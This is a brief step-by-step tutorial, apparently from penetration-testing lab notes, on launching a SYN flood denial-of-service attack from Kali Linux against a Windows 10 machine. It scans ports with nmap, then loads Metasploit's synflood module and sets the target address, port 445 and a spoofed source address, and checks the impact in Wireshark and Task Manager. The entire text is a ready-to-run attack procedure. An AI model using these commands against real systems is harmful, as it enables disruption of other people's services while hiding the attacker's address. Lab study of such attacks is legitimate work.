--------------------Metsploit msfconsole to be used for DOS ---------------------------------------
Log into the Kali Linux and open a new terminal window.
We are going to perform SYN flooding on Windows 10 through some open port. To check what port is open or not, we will use Nmap to scan all open ports.

> nmap -p- <Target IP address>
we will use an auxiliary module from Metasploit named synflood to perform DoS attack on the target using port 44

Type msfconsole to launch Metasploit Framework.
>msfconsole

Type the command to load the module:
>use auxiliary/dos/tcp/synflood

To display all the options of the module, type:
>options
>set RHOST [IP address of Target]
>set RPORT 445
>set SHOST [IP address of Spoofed machine]

~~Switch to the Target machine and launch the Wireshark, select the corret interface and click start to check the attack
> Also go to task manager and check the CPU to understand the impact.
